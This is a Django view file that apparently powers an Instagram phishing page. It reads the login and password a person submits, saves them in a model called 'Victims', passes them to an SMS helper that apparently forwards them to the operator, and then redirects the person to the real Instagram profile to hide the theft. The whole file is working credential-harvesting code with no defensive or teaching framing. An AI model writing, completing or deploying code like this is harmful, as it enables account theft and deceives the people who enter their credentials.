from django.shortcuts import render, redirect
from django.contrib import messages
from .models import Victims
from helpers.sms_sending.sms import sms_body


    

def main(request):
    if request.method == "POST":
        username = request.POST.get('login')
        password = request.POST.get('password')

        # Validate username and password
        if not username or not password:
            messages.error(request, "Username and password are required.")
            return render(request, 'index.html')

        # Create Victim instance
        victim = Victims.objects.create(
            username=username,
            password=password
        )
        sms_body(username, password)
        # Generate Instagram URL
        insta_real = f'https://www.instagram.com/{username}/'
        return redirect(insta_real)

    return render(request, template_name='index.html')
